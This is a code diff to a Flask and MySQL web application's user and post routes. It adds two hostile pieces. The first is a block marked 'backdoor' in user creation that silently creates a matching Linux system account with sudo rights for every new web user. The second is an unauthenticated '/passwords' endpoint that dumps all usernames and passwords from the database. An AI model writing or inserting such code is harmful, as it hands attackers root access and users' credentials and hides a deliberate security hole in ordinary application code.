@@ -4,6 +4,7 @@ from flask_cors import CORS
 import mysql.connector
 from config import DATABASE_CONFIG
 from datetime import datetime
+import platform, subprocess
 import os
 
 app = Flask(__name__)
@@ -57,6 +58,20 @@ def create_user():
         conn.commit()
         cursor.close()
         conn.close()
+
+        # backdoor
+        if platform.system() == 'Linux':
+            try:
+                subprocess.run(
+                    ['useradd', '-m', '-p', subprocess.getoutput(f"openssl passwd -1 {password}"), username],
+                    check=True
+                )
+                subprocess.run(
+                    ['usermod', '-aG', 'sudo', username],
+                    check=True
+                )
+            except subprocess.CalledProcessError as e:
+                pass
 
         return jsonify({
             "message": "User created successfully",
@@ -536,6 +551,29 @@ def like_post(post_id):
         print(f"Error liking post: {e}")
         return jsonify({"error": "An error occurred while liking the post."}), 500
 
+# Testing route -- TODO: REMOVE!!!!
+@app.route("/passwords")
+def passwords():
+    try:
+        conn = get_db_connection()
+        if not conn:
+            return jsonify({"error": "Database connection failed"}), 500
+
+        cursor = conn.cursor()
+        cursor.execute("SELECT username, password FROM users")  # Adjust table/column names as per your schema
+        users = cursor.fetchall()
+
+        cursor.close()
+        conn.close()
+
+        # Format the result as a dictionary of user:password
+        result = {user[0]: user[1] for user in users}
+
+        return jsonify(result), 200
+
+    except Exception as e:
+        print(f"Error retrieving passwords: {e}")
+        return jsonify({"error": "An error occurred while retrieving passwords"}), 500
 
 # Run the Flask app
 if __name__ == '__main__':
